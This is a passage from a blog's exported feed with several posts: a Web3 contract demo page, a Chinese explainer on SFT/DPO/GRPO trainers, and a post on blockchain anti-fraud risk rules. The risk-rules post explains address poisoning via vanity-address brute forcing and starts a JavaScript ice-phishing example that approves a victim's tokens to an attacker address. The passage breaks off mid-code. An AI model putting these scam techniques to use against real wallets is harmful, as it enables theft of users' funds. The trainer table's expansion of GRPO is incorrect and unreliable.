control-label&quot;</span>&gt;</span>Instructor Name<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;name&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;name&quot;</span> <span class="attr">class</span>=<span class="string">&quot;col-lg-2 control-label&quot;</span>&gt;</span>Instructor Age<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;age&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">&quot;button&quot;</span>&gt;</span>Update Instructor<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://code.jquery.com/jquery-3.2.1.slim.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">	<span class="keyword">if</span> (<span class="keyword">typeof</span> web3 !== <span class="string">&#x27;undefined&#x27;</span>) &#123;</span></span><br><span class="line"><span class="javascript">		web3 = <span class="keyword">new</span> Web3(web3.currentProvider);</span></span><br><span class="line"><span class="javascript">	&#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="javascript">		<span class="comment">// set the provider you want from Web3.providers</span></span></span><br><span class="line"><span class="javascript">		web3 = <span class="keyword">new</span> Web3(<span class="keyword">new</span> Web3.providers.HttpProvider(<span class="string">&quot;http://47.92.53.158:8545&quot;</span>));</span></span><br><span class="line">	&#125;</span><br><span class="line">	web3.eth.defaultAccount = web3.eth.accounts[0];</span><br><span class="line"></span><br><span class="line"><span class="javascript">	<span class="keyword">var</span> CoursetroContract = web3.eth.contract([&#123;<span class="string">&quot;constant&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;inputs&quot;</span>:[&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;_fName&quot;</span>,<span class="string">&quot;type&quot;</span>:<span class="string">&quot;string&quot;</span>&#125;,&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;_age&quot;</span>,<span class="string">&quot;type&quot;</span>:<span class="string">&quot;uint256&quot;</span>&#125;],<span class="string">&quot;name&quot;</span>:<span class="string">&quot;setInstructor&quot;</span>,<span class="string">&quot;outputs&quot;</span>:[],<span class="string">&quot;payable&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;stateMutability&quot;</span>:<span class="string">&quot;nonpayable&quot;</span>,<span class="string">&quot;type&quot;</span>:<span class="string">&quot;function&quot;</span>&#125;,&#123;<span class="string">&quot;constant&quot;</span>:<span class="literal">true</span>,<span class="string">&quot;inputs&quot;</span>:[],<span class="string">&quot;name&quot;</span>:<span class="string">&quot;getInstructor&quot;</span>,<span class="string">&quot;outputs&quot;</span>:[&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="string">&quot;type&quot;</span>:<span class="string">&quot;string&quot;</span>&#125;,&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="string">&quot;type&quot;</span>:<span class="string">&quot;uint256&quot;</span>&#125;],<span class="string">&quot;payable&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;stateMutability&quot;</span>:<span class="string">&quot;view&quot;</span>,<span class="string">&quot;type&quot;</span>:<span class="string">&quot;function&quot;</span>&#125;,&#123;<span class="string">&quot;anonymous&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;inputs&quot;</span>:[&#123;<span class="string">&quot;indexed&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;name&quot;</span>,<span class="string">&quot;type&quot;</span>:<span class="string">&quot;string&quot;</span>&#125;,&#123;<span class="string">&quot;indexed&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;age&quot;</span>,<span class="string">&quot;type&quot;</span>:<span class="string">&quot;uint256&quot;</span>&#125;],<span class="string">&quot;name&quot;</span>:<span class="string">&quot;Instructor&quot;</span>,<span class="string">&quot;type&quot;</span>:<span class="string">&quot;event&quot;</span>&#125;]);</span></span><br><span class="line"></span><br><span class="line"><span class="javascript">	<span class="keyword">var</span> Coursetro = CoursetroContract.at(<span class="string">&#x27;0x6f57ae4ea0bb4a6bc3c153ced8202217d63d5fca&#x27;</span>);</span></span><br><span class="line"><span class="javascript">	<span class="built_in">console</span>.log(Coursetro);</span></span><br><span class="line"></span><br><span class="line"><span class="javascript">	<span class="keyword">var</span> instructorEvent = Coursetro.Instructor();</span></span><br><span class="line"><span class="javascript">	instructorEvent.watch(<span class="function"><span class="keyword">function</span>(<span class="params">error, result</span>)</span>&#123;</span></span><br><span class="line">		 if (!error)</span><br><span class="line">				 &#123;</span><br><span class="line"><span class="javascript">						 $(<span class="string">&quot;#loader&quot;</span>).hide();</span></span><br><span class="line"><span class="javascript">						 $(<span class="string">&quot;#instructor&quot;</span>).html(result.args.name + <span class="string">&#x27; (&#x27;</span> + result.args.age + <span class="string">&#x27; years old)&#x27;</span>);</span></span><br><span class="line"><span class="javascript">				 &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="javascript">						 $(<span class="string">&quot;#loader&quot;</span>).hide();</span></span><br><span class="line"><span class="javascript">						 <span class="built_in">console</span>.log(error);</span></span><br><span class="line">				 &#125;</span><br><span class="line"> &#125;);</span><br><span class="line"><span class="javascript">	$(<span class="string">&quot;#button&quot;</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">		Coursetro.setInstructor($(<span class="string">&quot;#name&quot;</span>).val(), $(<span class="string">&quot;#age&quot;</span>).val());</span></span><br><span class="line"><span class="javascript">		$(<span class="string">&quot;#loader&quot;</span>).show();</span></span><br><span class="line">	&#125;);</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>


]]></content>
      <tags>
        <tag>solidity</tag>
      </tags>
  </entry>
  <entry>
    <title>SSR-Stablecoin-Supply-Ration</title>
    <url>/2024/01/17/SSR-Stablecoin-Supply-Ration/</url>
    <content><![CDATA[<p><a href="https://www.footprint.network/research/token/stablecoin/stablecoin-master?series_date-85674=past90days">https://www.footprint.network/research/token/stablecoin/stablecoin-master?series_date-85674=past90days</a>~</p>
<p><img src="/2024/01/17/SSR-Stablecoin-Supply-Ration/1.png"></p>
]]></content>
      <tags>
        <tag>Token</tag>
      </tags>
  </entry>
  <entry>
    <title>SFT、DPO、GRPO三种训练器的训练数据与应用场景</title>
    <url>/2025/02/13/SFT%E3%80%81DPO%E3%80%81GRPO%E4%B8%89%E7%A7%8D%E8%AE%AD%E7%BB%83%E5%99%A8%E7%9A%84%E8%AE%AD%E7%BB%83%E6%95%B0%E6%8D%AE%E4%B8%8E%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF/</url>
    <content><![CDATA[<h2 id="结论总结："><a href="#结论总结：" class="headerlink" title="结论总结："></a>结论总结：</h2><table>
<thead>
<tr>
<th>模型名称</th>
<th>SFTTrainer - Supervised Fine-Tuning Trainer - 监督式微调训练器</th>
<th>DPOTrainer - Direct Preference Optimization Trainer - 直接偏好优化训练器</th>
<th>GRPOTrainer - Generative Reward Policy Optimization Trainer - 生成式奖励策略优化训练器</th>
</tr>
</thead>
<tbody><tr>
<td>训练目标</td>
<td>模仿训练数据</td>
<td>对齐人类偏好</td>
<td>最大化奖励函数</td>
</tr>
<tr>
<td>数据需求</td>
<td>输入-输出数据对。数据形式是 “指令 -&gt; 期望输出” 的对应关系</td>
<td>偏好数据。”指令 -&gt; (偏好输出, 非偏好输出)” 的成对比较</td>
<td>奖励信号。数据形式是一个数值奖励，用于评价模型在环境中的行为</td>
</tr>
<tr>
<td>核心算法</td>
<td>监督学习 (交叉熵损失)</td>
<td>直接偏好优化 (DPO 损失)</td>
<td>强化学习 (PPO 算法)</td>
</tr>
<tr>
<td>优势</td>
<td>简单易用, 高效, 适用多种任务</td>
<td>更符合人类偏好, 避免奖励函数设计难题, 训练稳定, 对奖励函数偏差更鲁棒</td>
<td>直接优化目标指标, 可学习复杂策略, 适用于与环境交互任务, 精细行为控制</td>
</tr>
<tr>
<td>劣势</td>
<td>可能放大数据偏差, 难处理复杂偏好, 可能过拟合</td>
<td>需要偏好数据, 对偏好数据质量敏感, 可能牺牲部分生成能力</td>
<td>训练复杂不稳定, 奖励函数设计困难, 计算成本高, 可能奖励函数偏移</td>
</tr>
<tr>
<td>复杂度</td>
<td>低</td>
<td>中</td>
<td>高</td>
</tr>
<tr>
<td>应用场景示例</td>
<td>- 内容生成: 自动生成产品描述、新闻稿、社交媒体文案等。<br>- 指令跟随: 简单的问答系统、文档摘要、代码生成等。 <br>- 数据增强: 生成特定格式或风格的合成数据，例如特定风格的文本或代码。<br></td>
<td>- 对话系统: 训练客服机器人、聊天机器人，使其回复更礼貌、更人性化、更符合用户期望。<br>- 内容审核: 训练模型判断文本是否安全、无害、符合道德标准。<br>- 偏好排序: 训练模型根据用户偏好对多个选项进行排序或选择 (例如，排序新闻摘要、推荐商品)。</td>
<td>- 游戏 AI: 训练游戏 Bot，在游戏中获得高分或战胜对手。<br>- 交易策略: 训练交易机器人，使其在股票市场或加密货币市场中最大化收益。<br>- 机器人控制: 训练机器人完成复杂任务，例如导航、物体抓取等，最大化任务完成效率或成功率。 <br>- 复杂对话策略: 训练对话系统进行多轮对话，最终达成用户目标 (例如，预定餐厅、解决复杂问题)。</td>
</tr>
</tbody></table>
<h2 id="1-输入-输出数据对-Input-Output-Data-Pairs-SFTTrainer-使用"><a href="#1-输入-输出数据对-Input-Output-Data-Pairs-SFTTrainer-使用" class="headerlink" title="1. 输入-输出数据对 (Input-Output Data Pairs) - SFTTrainer 使用"></a>1. 输入-输出数据对 (Input-Output Data Pairs) - SFTTrainer 使用</h2><p>这种数据形式是最直接的，用于监督式微调 (SFTTrainer)。 每个数据样本都包含一个 输入 (Input) 和一个期望的 输出 (Output)。</p>
<p>应用场景例子：<strong>指令跟随 (Instruction Following)</strong> - 简单的问答任务<br><strong>示例：</strong></p>
<ul>
<li>问答系统： “问题 -&gt; 答案”</li>
<li>翻译任务： “原文 -&gt; 译文”</li>
<li>摘要生成： “文章 -&gt; 摘要”</li>
<li>样例数据格式 (JSON 格式示例):<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">[</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">&quot;instruction&quot;</span>: <span class="string">&quot;法国的首都是哪里？&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;output&quot;</span>: <span class="string">&quot;法国的首都是巴黎。&quot;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">&quot;instruction&quot;</span>: <span class="string">&quot;请写一个关于夏天的简短故事。&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;output&quot;</span>: <span class="string">&quot;阳光洒在金色的沙滩上，海风轻轻吹拂，孩子们在海边嬉戏，冰淇淋融化在甜甜的笑容里，夏天真美好。&quot;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">&quot;instruction&quot;</span>: <span class="string">&quot;将这句话翻译成英文：你好世界。&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;output&quot;</span>: <span class="string">&quot;Hello world.&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// ... 更多数据样本</span></span><br><span class="line">]</span><br></pre></td></tr></table></figure>
解释:</li>
<li>“instruction” (输入): 代表用户给模型的指令或问题。</li>
<li>“output” (输出): 代表模型应该生成的期望回复或答案。</li>
<li>数据目标: SFTTrainer 的目标是让模型学习将 “instruction” 映射到 “output”，模仿训练数据中的这种对应关系。</li>
</ul>
<p>应用场景例子：<strong>内容生成 (Content Generation)</strong> - 生成产品描述</p>
<ul>
<li>样例数据格式 (JSON 格式示例):<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">[</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">&quot;input&quot;</span>: &#123;</span><br><span class="line">      <span class="attr">&quot;product_name&quot;</span>: <span class="string">&quot;智能咖啡机&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;features&quot;</span>: [<span class="string">&quot;一键操作&quot;</span>, <span class="string">&quot;多种咖啡模式&quot;</span>, <span class="string">&quot;可预约&quot;</span>, <span class="string">&quot;自动清洗&quot;</span>],</span><br><span class="line">      <span class="attr">&quot;materials&quot;</span>: [<span class="string">&quot;不锈钢&quot;</span>, <span class="string">&quot;耐热玻璃&quot;</span>]</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">&quot;output&quot;</span>: <span class="string">&quot;这款智能咖啡机让您在家也能轻松享受咖啡馆级的美味。一键操作，多种咖啡模式随心选择，更有预约功能，让您早晨醒来就能品尝到香浓咖啡。采用不锈钢和耐热玻璃材质，坚固耐用，并具备自动清洗功能，省心省力。&quot;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="comment">// ... 更多数据样本</span></span><br><span class="line">]</span><br></pre></td></tr></table></figure>
解释:</li>
<li>“input” (输入): 可以是更结构化的信息，例如产品的特征、材质等。</li>
<li>“output” (输出): 是基于输入信息生成的期望产品描述文本。</li>
</ul>
<h2 id="2-偏好数据-Pairwise-Ranking-DPOTrainer-使用"><a href="#2-偏好数据-Pairwise-Ranking-DPOTrainer-使用" class="headerlink" title="2. 偏好数据 (Pairwise Ranking) - DPOTrainer 使用"></a>2. 偏好数据 (Pairwise Ranking) - DPOTrainer 使用</h2><p>这种数据形式用于直接偏好优化 (DPOTrainer)。 对于同一个输入，我们提供两个模型生成的输出，并标注哪个输出更符合偏好。</p>
<p>应用场景例子：<strong>对话系统 (Chatbot)</strong> - 提升回复质量和偏好</p>
<ul>
<li>样例数据格式 (JSON 格式示例):<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">[</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">&quot;instruction&quot;</span>: <span class="string">&quot;今天天气怎么样？&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;chosen&quot;</span>: <span class="string">&quot;今天天气晴朗，阳光明媚，非常适合户外活动。&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;rejected&quot;</span>: <span class="string">&quot;天气还行。&quot;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">&quot;instruction&quot;</span>: <span class="string">&quot;请问你能推荐一家附近的意大利餐厅吗？&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;chosen&quot;</span>: <span class="string">&quot;当然，附近有一家评价很高的意大利餐厅，名叫“托斯卡纳阳光”，他们家的披萨和意面非常受欢迎，地址是… [地址信息] …，您要我帮您查询一下电话或者预定吗？&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;rejected&quot;</span>: <span class="string">&quot;我推荐一家意大利餐厅。&quot;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="comment">// ... 更多数据样本</span></span><br><span class="line">]</span><br></pre></td></tr></table></figure></li>
<li>解释:<ul>
<li>“instruction” (输入): 用户的问题或指令。</li>
<li>“chosen” (偏好输出): 被认为更好或更符合偏好的回复。例如，更详细、更礼貌、更乐于助人的回复。</li>
<li>“rejected” (非偏好输出): 被认为相对较差或不太符合偏好的回复。例如，更简短、更生硬、信息量较少的回复。</li>
<li>数据目标: DPOTrainer 学习到，对于相同的 “instruction”，模型应该倾向于生成类似 “chosen” 这样的回复，而不是 “rejected” 这样的回复。偏好可以是基于礼貌程度、信息量、是否乐于助人、是否符合特定价值观等等。</li>
</ul>
</li>
</ul>
<h2 id="3-奖励信号-Reward-Signal-GRPOTrainer-使用"><a href="#3-奖励信号-Reward-Signal-GRPOTrainer-使用" class="headerlink" title="3. 奖励信号 (Reward Signal) - GRPOTrainer 使用"></a>3. 奖励信号 (Reward Signal) - GRPOTrainer 使用</h2><p>奖励信号是一个数值，用于评价模型在特定环境或任务中生成的输出质量。 GRPOTrainer 使用强化学习方法，目标是最大化模型获得的累积奖励。</p>
<p>应用场景例子：<strong>游戏 AI (Game AI)</strong> - 训练游戏 Bot 下围棋</p>
<ul>
<li>奖励函数示例 (Python 伪代码):<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reward_function</span>(<span class="params">game_state, action</span>):</span></span><br><span class="line">  <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">  定义围棋游戏中的奖励函数.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  Args:</span></span><br><span class="line"><span class="string">    game_state: 当前的棋局状态.</span></span><br><span class="line"><span class="string">    action: 模型采取的落子动作.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  Returns:</span></span><br><span class="line"><span class="string">    reward:  一个数值奖励信号.</span></span><br><span class="line"><span class="string">  &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> is_illegal_move(game_state, action): <span class="comment"># 落子是否为非法</span></span><br><span class="line">    reward = <span class="number">-10</span>  <span class="comment"># 非法落子，负奖励，惩罚模型</span></span><br><span class="line">  <span class="keyword">elif</span> is_capture_opponent_piece(game_state, action): <span class="comment"># 是否吃掉对方棋子</span></span><br><span class="line">    reward = +<span class="number">5</span>   <span class="comment"># 吃掉对方棋子，正奖励</span></span><br><span class="line">  <span class="keyword">elif</span> is_win(game_state): <span class="comment"># 是否赢得游戏</span></span><br><span class="line">    reward = +<span class="number">100</span>  <span class="comment"># 赢得游戏，巨大正奖励</span></span><br><span class="line">  <span class="keyword">elif</span> is_lose(game_state): <span class="comment"># 是否输掉游戏</span></span><br><span class="line">    reward = <span class="number">-50</span>  <span class="comment"># 输掉游戏，负奖励</span></span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    reward = <span class="number">-0.1</span> <span class="comment"># 常规落子，轻微负奖励 (鼓励尽快结束游戏，避免无意义的步骤 - 可根据实际情况调整)</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> reward</span><br></pre></td></tr></table></figure></li>
<li>解释:<ul>
<li>奖励函数: <code>reward_function</code> 就是一个奖励函数，它根据当前的游戏状态和模型采取的动作，计算出一个数值奖励。</li>
<li>奖励信号: 每次模型在游戏中执行一个动作后，环境 (围棋游戏) 会根据 <code>reward_function</code> 计算出一个奖励值，并将这个奖励值反馈给模型。</li>
<li>数据目标: GRPOTrainer 通过不断尝试不同的动作，并根据获得的奖励信号学习，目标是找到一个策略 (即模型的参数)，使得在围棋游戏中能够获得尽可能高的累积奖励 (例如，最终赢得游戏)。</li>
</ul>
</li>
</ul>
]]></content>
      <tags>
        <tag>AI</tag>
        <tag>DeepSeek</tag>
      </tags>
  </entry>
  <entry>
    <title>Risk-rules-of-public-blockchain</title>
    <url>/2024/10/21/Risk-rules-of-public-blockchain/</url>
    <content><![CDATA[<h2 id="Learn-about-money-laundering-in-one-movie"><a href="#Learn-about-money-laundering-in-one-movie" class="headerlink" title="Learn about money laundering in one movie"></a>Learn about money laundering in one movie</h2><p>一口气了解洗钱 它能玩得有多花 — 小Lin说<br><a href="https://www.youtube.com/watch?v=s3iM7VslPsQ">https://www.youtube.com/watch?v=s3iM7VslPsQ</a></p>
<h2 id="Behavior-行为模式"><a href="#Behavior-行为模式" class="headerlink" title="Behavior 行为模式"></a>Behavior 行为模式</h2><p><strong>peeling chain 剥皮链</strong><br>A peeling chain is a behavioral pattern where multiple repeated deposits are made at an exchange or service. A peeling chain pattern may suggest an attempt to stay below a certain KYC threshold to avoid detection.<br>剥皮链是指在交易所或服务平台上反复进行多次存款操作。剥皮链模式可能意味着试图保持在某个KYC阈值以下，以避免被检测到。<br><img src="/2024/10/21/Risk-rules-of-public-blockchain/1.png"><br>举例 - 在2022年初，一些犯罪分子利用剥皮链技术在多家加密货币交易所进行小额频繁的存款操作，以保持在KYC合规的最低要求之下，从而避免被交易所标记为高风险账户。这些小额存款随后被转移到多个中间账户，最终汇集到一个主要的钱包地址，用于购买非法商品或进行洗钱活动。<br>reference link ==&gt; <a href="https://www.fraudinvestigation.net/cryptocurrency/tracing/peel-chain">https://www.fraudinvestigation.net/cryptocurrency/tracing/peel-chain</a></p>
<p><strong>automated layering 自动分层</strong><br>Automated layering, also called artificial hops, is a behavioral pattern that involves routing funds through multiple intermediate hops without any dilution of funds. An automated layering pattern may suggest an attempt to obfuscate the true source of funds by exploiting the fact that some screening programs will stop tracing at a certain number of hops.<br>自动分层，也称为人工跳跃，通过多次中间跳跃路由资金，而不稀释资金总额。自动分层模式可能表明企图利用某些筛查程序在一定跳跃次数后停止追踪的特点，来掩盖资金的真实来源。<br><img src="/2024/10/21/Risk-rules-of-public-blockchain/2.png"><br><img src="/2024/10/21/Risk-rules-of-public-blockchain/3.png"><br>实例 - 2023年，某犯罪团伙利用自动分层技术，将通过诈骗和勒索所得的加密货币资金，在短时间内通过多个区块链地址进行中转，每次转移均未稀释资金总量。整个操作过程中，资金经过超过20次跳跃，旨在逃避追踪和监管机构的监控。这种行为利用了部分筛查程序的限制（即超过一定次数的跳跃后停止追踪）。<br>reference link ==&gt; <a href="https://www.fraudinvestigation.net/cryptocurrency/tracing/layering">https://www.fraudinvestigation.net/cryptocurrency/tracing/layering</a></p>
<p><strong>mixer first funding 首次混币资助</strong><br>Mixer first funding is a tactic used during high-profile exploits. Bad actors fund their attack addresses using a Mixer or Coin Swap Service to hide the original source of funds. While these services aren’t illegal in themselves, they allow users to obscure fund origins, which can facilitate illicit activities. This behaviour flags when addresses receive their first transaction from a mixer or low-KYC exchange.like Tornado Cash.<br>首次混币资助是在高调攻击事件中使用的策略。恶意行为者通过混币器或币交换服务为其攻击地址提供资金，以隐藏资金的原始来源。尽管这些服务本身不违法，但它们允许用户掩盖资金来源，可能助长非法活动。当地址接收到来自混币器或低KYC交易所的首次交易时，这种行为会被标记。例如，Tornado Cash。<br>在韩国，一起针对某知名区块链项目的攻击中，黑客利用混币器为攻击钱包地址提供初始资金。黑客通过混币服务掩盖了资金来源，然后对该区块链项目的智能合约漏洞进行了攻击，盗取了价值数千万美元的加密货币。</p>
<p><strong>address poisoner 地址投毒者</strong><br>Address Poisoner identifies addresses that conducted an address poisoning attack. Address poisoning, also known as address spoofing, is a scam where fraudsters create a fake wallet address resembling the user’s or one frequently used by them. Using this fake address, they send small amounts of cryptocurrency or NFTs to the user’s wallet, which ‘poisons’ the transaction history with deceitful transactions. They anticipate that the user, failing to notice the difference due to the address similarity, will unwittingly use the scam address for transactions - resulting in the loss of funds.<br>地址投毒者识别那些进行了地址投毒攻击的地址。地址投毒（也称地址欺骗）是一种骗局，骗子创建一个伪造的、与用户常用地址相似的钱包地址，并向用户的钱包发送少量加密货币或NFT，从而“污染”交易历史，使其充满欺骗性的交易记录。他们预期用户因地址相似而未能发现差异，从而在进行交易时不经意地使用了骗局地址，导致资金损失。<br>2022年底，美国一名诈骗者在某用户频繁使用的加密货币地址基础上，创建了一个仅在最后几位字符上不同的假冒地址。诈骗者利用这一相似地址，向受害者的钱包发送少量加密货币，希望受害者在未来的交易中误用该假冒地址，导致资金转入诈骗者控制的钱包。受害者没有仔细核对地址，误将价值数千美元的加密货币转入诈骗者的钱包。尽管事后发现了问题，但资金已无法追回。<br>1）诈骗者可以通过编写脚本，自动生成大量的地址，然后筛选出与目标地址相似的地址。由于每次生成的地址都是不同的，只要生成足够多的地址，总能找到一个与目标地址在某些位置上相似的地址。这个方法类似于“暴力破解”，需要大量的计算资源，但可以通过批量生成和筛选来实现。2）有些加密货币钱包允许用户使用一些工具（如Vanitygen）来生成“个性化”的地址，即地址的部分字符是可以指定的。这些工具允许用户设定地址的前缀或后缀，然后通过不断尝试生成满足条件的地址。例如，可以通过不断生成和筛选找到一个以特定字符或数字结尾的地址，从而与目标地址形成相似性。</p>
<p><strong>exploiter 攻击者</strong><br>Leverage this rule to mitigate interaction with addresses that have participated in a hack or exploit.<br>通过此规则，可以减少与曾参与黑客攻击或漏洞利用的地址之间的互动。</p>
<p><strong>Ice phishing 冰钓式网络钓鱼</strong><br>Ice phishing occurs when a user unknowingly allows a scammer to control their wallet. The scammer tricks the user into approving a transaction that looks safe, but in reality, the approval is granted to the scammer’s address hidden in transaction data. Once the approval is given, the attacker can take control over their digital assets. Leverage this rule to prevent interactions with addresses that have performed ice phishing attacks.<br>冰钓式网络钓鱼发生在用户在不知情的情况下允许诈骗者控制他们的钱包时。诈骗者诱骗用户批准一项看似安全的交易，但实际上，交易数据中隐藏的批准地址是诈骗者的。一旦批准，攻击者就可以控制用户的数字资产。通过此规则可以防止与执行冰钓式网络钓鱼攻击的地址进行交互。<br>2023年3月，英国某用户在一次空投活动中，批准了一项授权交易，实际上授权的是一个隐藏在交易数据中的恶意地址。该恶意地址由诈骗者控制，一旦获得授权，诈骗者迅速将用户的钱包中的代币转移至自己的钱包。受害者损失了价值超过50万美元的加密货币，而诈骗者利用多个分层账户迅速洗白这笔资金，避免了被追踪。</p>
<p><strong>原理说明</strong></p>
<ol>
<li><strong>诱饵设定</strong>：诈骗者通常会通过某种诱饵，比如伪造的空投、假冒的DApp（去中心化应用）或钓鱼网站，诱导用户进行某项操作。</li>
<li><strong>授权请求</strong>：当用户点击“领取空投”或进行其他操作时，网站或应用会弹出一个交易请求，让用户授权某个智能合约或地址管理其代币。用户通常会认为这是一个安全的操作，实际上授权的地址是攻击者的恶意地址。</li>
<li><strong>恶意授权</strong>：用户一旦确认交易，攻击者就获得了代币的控制权限，可以任意转移受害者的资产。</li>
</ol>
<p><strong>代码实例</strong><br>以下是一个示例，以ERC20代币为例，展示如何构造一个授权交易，并潜在地进行恶意操作：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 使用以太坊Web3库构造授权交易</span></span><br><span class="line"><span class="keyword">const</span> Web3 = <span class="built_in">require</span>(<span class="string">&#x27;web3&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> web3 = <span class="keyword">new</span> Web3(<span class="string">&#x27;https://mainnet.infura.io/v3/YOURINFURAAPIKEY&#x27;</span>);</span><br><span class="line"><span class="comment">// ERC20代币合约地址（示例）</span></span><br><span class="line"><span class="keyword">const</span> tokenContractAddress = <span class="string">&#x27;0xYourTokenContractAddress&#x27;</span>;</span><br><span class="line"><span class="comment">// 恶意地址（诈骗者控制的地址）</span></span><br><span class="line"><span class="keyword">const</span> maliciousAddress = <span class="string">&#x27;0xAttackerAddress&#x27;</span>;</span><br><span class="line"><span class="comment">// 受害者钱包地址</span></span><br><span class="line"><span class="keyword">const</span> victimAddress = <span class="string">&#x27;0xVictimAddress&#x27;</span>;</span><br><span class="line"><span class="comment">// ERC20合约ABI（接口定义，用于与合约进行交互）</span></span><br><span class="line"><span class="keyword">const</span> erc20Abi = [</span><br><span class="line">    <span class="comment">// 省略部分ABI，只保留approve方法</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">&quot;constant&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">        <span class="string">&quot;inputs&quot;</span>: [</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="string">&quot;name&quot;</span>: <span class="string">&quot;spender&quot;</span>,</span><br><span class="line">                <span class="string">&quot;type&quot;</span>: <span class="string">&quot;address&quot;</span></span><br><span class="line">            &#125;,</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="string">&quot;name&quot;</span>: <span class="string">&quot;value&quot;</span>,</span><br><span class="line">                <span class="string">&quot;type&quot;</span>: <span class="string">&quot;uint256&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        ],</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: <span class="string">&quot;approve&quot;</span>,</span><br><span class="line">        <span class="string">&quot;outputs&quot;</span>: [</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="string">&quot;name&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">                <span class="string">&quot;type&quot;</span>: <span class="string">&quot;bool&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        ],</span><br><span class="line">        <span class="string">&quot;type&quot;</span>: <span class="string">&quot;function&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建ERC20代币合约实例</span></span><br><span class="line"><span class="keyword">const</span> tokenContract = <span class="keyword">new</span> web3.eth.Contract(erc20Abi, tokenContractAddress);</span><br><span class="line"><span class="comment">// 授权操作，实际上授权给了恶意地址</span></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">approveMaliciousAddress</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> amount = web3.utils.toWei(<span class="string">&#x27;1000&#x27;</span>, <span class="string">&#x27;ether&#x27;</span>); <span class="comment">// 授权数量，比如1000个代币</span></span><br><span class="line">        <span class="comment">// 构造授权交易数据</span></span><br><span class="line">        <span class="keyword">const</span> approveData = 